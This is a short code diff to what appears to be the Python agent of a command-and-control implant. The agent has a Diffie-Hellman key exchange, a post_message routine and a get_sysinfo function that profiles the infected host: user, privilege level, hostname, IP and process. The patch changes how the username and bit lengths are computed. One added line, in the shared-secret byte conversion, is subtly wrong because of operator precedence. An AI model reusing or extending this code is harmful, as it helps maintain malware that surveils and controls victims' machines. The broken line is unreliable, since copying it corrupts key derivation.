@@ -8,6 +8,7 @@ import copy
 import sys
 import struct
 import os
+import pwd
 import hashlib
 import random
 import string
@@ -95,7 +96,7 @@ class DiffieHellman(object):
         _rand = 0
         _bytes = bits // 8 + 8
 
-        while(_rand.bit_length() < bits):
+        while(len(bin(_rand))-2 < bits):
 
             try:
                 _rand = int.from_bytes(random_function(_bytes), byteorder='big')
@@ -147,7 +148,7 @@ class DiffieHellman(object):
         # Otherwise hashlib can't hash it.
         try:
             _sharedSecretBytes = self.sharedSecret.to_bytes(
-                self.sharedSecret.bit_length() // 8 + 1, byteorder="big")
+                len(bin(self.sharedSecret))-2 // 8 + 1, byteorder="big")
         except AttributeError:
             _sharedSecretBytes = str(self.sharedSecret)
 
@@ -585,7 +586,8 @@ def post_message(uri, data):
 def get_sysinfo():
 
     # listener | username | high_integrity | hostname | internal_ip | os_details | process_id | py_version
-    username = os.getlogin()
+    #username = os.getlogin()
+    username = pwd.getpwuid(os.getuid())[0] 
 
     uid = os.popen('id -u').read().strip()
     highIntegrity = "True" if (uid == "0") else False
